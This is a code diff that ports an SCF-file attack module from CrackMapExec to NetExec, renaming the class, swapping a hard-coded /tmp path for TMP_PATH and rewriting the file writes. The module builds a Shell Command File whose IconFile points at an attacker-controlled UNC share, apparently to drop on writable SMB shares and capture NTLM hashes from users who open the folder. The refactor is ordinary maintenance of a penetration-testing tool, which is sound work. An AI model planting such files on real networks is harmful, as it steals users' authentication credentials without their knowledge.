@@ -1,11 +1,9 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 import ntpath
 from sys import exit
+from nxc.paths import TMP_PATH
 
 
-class CMEModule:
+class NXCModule:
     """
     Original idea and PoC by Mubix "Rob" Fuller
     URL: https://room362.com/post/2016/smb-http-auth-capture-via-scf/
@@ -47,16 +45,16 @@ class CMEModule:
             exit(1)
 
         self.scf_name = module_options["NAME"]
-        self.scf_path = f"/tmp/{self.scf_name}.scf"
+        self.scf_path = f"{TMP_PATH}/{self.scf_name}.scf"
         self.file_path = ntpath.join("\\", f"{self.scf_name}.scf")
 
         if not self.cleanup:
             self.server = module_options["SERVER"]
-            scuf = open(self.scf_path, "a")
-            scuf.write(f"[Shell]\n")
-            scuf.write(f"Command=2\n")
-            scuf.write(f"IconFile=\\\\{self.server}\\share\\icon.ico\n")
-            scuf.close()
+            
+            with open(self.scf_path, "a") as scuf:
+                scuf.write("[Shell]\n")
+                scuf.write("Command=2\n")
+                scuf.write(f"IconFile=\\\\{self.server}\\share\\icon.ico\n")
 
     def on_login(self, context, connection):
         shares = connection.shares()
